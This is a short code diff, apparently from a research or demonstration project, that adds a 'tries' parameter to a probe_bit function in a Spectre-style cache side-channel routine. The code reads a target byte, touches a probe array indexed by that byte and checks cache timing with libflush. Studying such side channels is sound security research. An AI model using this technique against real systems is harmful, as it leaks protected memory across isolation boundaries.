@@ -9,7 +9,7 @@ void spectre::Base::before() {
 void spectre::Base::after() {
 }
 
-void spectre::Base::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
+void spectre::Base::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
     uint8_t value = *data;
     volatile uint8_t tmp = cache_probe[(mask & value) * CACHE_LINE_SIZE];
 }
@@ -27,7 +27,7 @@ void spectre::Base::readMemoryByte(const uint8_t* target_ptr, uint8_t value[2], 
             fence();
 
             //Access that bit and signal on the cache_probe
-            this->probe_bit(mask, target_ptr, this->cache_probe);
+            this->probe_bit(tries, mask, target_ptr, this->cache_probe);
 
             // --- Check probing result measuring cache timing
             if (libflush.is_cache_hit(&cache_probe[mask * CACHE_LINE_SIZE])) {
